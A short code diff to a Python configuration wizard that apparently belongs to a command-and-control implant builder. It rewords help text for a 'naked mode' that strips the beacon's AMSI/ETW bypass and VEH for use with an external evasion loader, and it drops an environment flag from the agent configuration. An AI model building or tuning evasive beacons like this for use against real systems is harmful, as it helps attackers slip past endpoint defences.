@@ -515,8 +515,9 @@ class ProviderWizard(ABC):
 
         _p([("", "")])
         _p([("class:yellow", "  Naked Mode:")])
-        _p([("class:info",   "    Strip all beacon evasion (AMSI/VEH/PE resources). Use when wrapping with an external loader.")])
-        cfg.naked_mode = ask_yn("Naked beacon (external loader handles evasion)", cfg.naked_mode)
+        _p([("class:info",   "    Strips internal AMSI/ETW bypass and VEH from the beacon — use when")])
+        _p([("class:info",   "    an external loader (e.g. slayer-trellix) provides its own evasion")])
+        cfg.naked_mode = ask_yn("Enable naked mode (loader handles evasion)", cfg.naked_mode)
 
         self._step_configure_extra(cfg)
         self._show_config(cfg)
@@ -933,7 +934,6 @@ class ProviderWizard(ABC):
                         "STRATUM_SESSION_KEY":    cfg.session_key,
                         "STRATUM_PREKEY_POOL_B64": base64.b64encode(bytes.fromhex(cfg.prekey_pubs_hex)).decode(),
                         "STRATUM_DEBUG":          "true" if cfg.debug_mode else "false",
-                        "STRATUM_NAKED":          "true" if cfg.naked_mode else "false",
                     }
                 elif cfg.mode == "stageless-enc":
                     # Full agent; C2 config encrypted with stub_secret baked in stub.
